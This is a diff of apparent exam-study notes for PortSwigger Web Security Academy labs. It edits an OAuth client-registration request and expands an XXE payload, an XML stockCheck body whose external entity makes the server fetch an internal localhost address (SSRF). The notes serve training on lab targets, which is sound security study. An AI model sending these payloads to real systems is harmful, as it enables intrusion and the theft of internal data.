@@ -509,7 +509,7 @@ Host: COLLABORATOR.DOMAIN
 
 >POST request to register data to the clien application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs.  
 
-```json
+```html
 POST /reg HTTP/1.1
 Host: oauth-0a8b00df03e10b2ec300149f023b0096.web-security-academy.net
 Content-Type: application/json
@@ -527,13 +527,25 @@ Content-Length: 206
 
 ### XXE + SSRF
 
->XXE vulnerability to perform an SSRF attack that obtains sensitive data.  
-
-[PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
+>Exploiting XXE to perform SSRF attacks using stock check function that obtains sensitive data.  
 
 ```xml
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:6566/"> ]>  
+
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:6566/latest/"> ]>
+  <stockCheck>
+    <productId>
+      &xxe;
+    </productId>
+    <storeId>
+      1
+    </storeId>
+  </stockCheck>  
 ```  
+
+![xxe-ssrf-localhost.png](xxe-ssrf-localhost.png)  
+
+[PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
 
 
 ### HOST header routing-based  
